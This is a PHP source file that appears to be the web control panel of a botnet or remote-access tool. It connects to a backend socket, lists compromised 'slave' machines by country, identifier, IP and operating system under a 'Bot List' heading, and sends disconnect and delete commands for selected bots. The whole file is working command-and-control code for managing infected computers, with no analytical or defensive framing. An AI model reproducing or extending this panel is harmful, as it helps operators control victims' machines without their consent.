<?php
xdebug_disable();

require_once "request.php";

$request = new Request();
$sock = $request->createSocket();

if (isset($_POST ['select']) && isset($_POST ['action'])) {
	$action = $_POST ['action'];
	
	if ($action == "disconnect") {
		$request->write($sock, 10);
		$request->write($sock, count($_POST ['select']));
	}
	foreach ( $_POST ['select'] as $slave ) {
		$request->write($sock, $slave);
	}
} else {

}

$slaves = $request->getSlaves($sock);
$request->disconnect($sock);

?>

<script src="layout/jquery-1.11.2.js"></script>
<script src="layout/bootstrap.min.js"></script>
<script src="layout/modernizr.js"></script>
<script src="layout/proton.js"></script>

<link rel="stylesheet" href="layout/animate.css">
<link rel="stylesheet" href="layout/bootstrap.css">
<link rel="stylesheet" href="layout/jquery.pnotify.default.css">
<link rel="stylesheet" href="layout/proton.css">
<link rel="stylesheet" href="layout/select2.css">

<script>
$(document).ready(function() {
    $('#selectall').click(function(event) {  //on click 
        if(this.checked) { // check select status
            $('.box').each(function() { //loop through each checkbox
                this.checked = true;  //select all checkboxes with class "checkbox1"               
            });
        }else{
            $('.box').each(function() { //loop through each checkbox
                this.checked = false; //deselect all checkboxes with class "checkbox1"                       
            });         
        }
    });
    
});</script>


<div class="panel panel-default panel-block">
	<div class="list-group">
		<div class="list-group-item">
			<div class="form-group">
				<h4 class="section-title">Bot List</h4>
				<!--Basic Table-->

				<table class="table table-bordered table-striped">
					<thead class="">
						<tr>
							<th>Country</th>
							<th>Identifier</th>
							<th>IP</th>
							<th>Operating System</th>
							<th></th>
						</tr>
					</thead>
					<tbody>
	
					<?php
					/*
					 * $i = 1;
					 * foreach ($slaves as $slave) {
					 * echo "<tr>" . str_replace("%c", $i++ & 1 ? "tg-vn4c" : "tg-031e", $slave->getTableFormatted($i)) . "</tr>\n";
					 * }
					 */
					function printOut($s) {
						echo "<td>" . $s . "</td>\n";
					}
					
					foreach ( $slaves as $slave ) {
						echo "<tr>\n";
						echo printOut($slave->getDisplayCountry());
						echo printOut($slave->getIdentifier());
						echo printOut($slave->getIP());
						echo printOut($slave->getOperatingSystem());
						echo printOut("<a href='bots.php?id=" . $slave->getUniqueId() . "'><button type='button'class='btn btn-xs btn-danger'>Delete</button></a>");
						
						echo "</tr>\n";
					
					}
					?>
	
					</tbody>
				</table>
				<div class="form-group" align="right">
					<div>
						<ul class="pagination pagination-demo">
							<li><a href="bots.php?page=0">&laquo;</a></li>
							<li><a href='bots.php?page=1'>1</a></li>
							<li><a href="bots.php?page=2">&raquo;</a></li>
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</div>
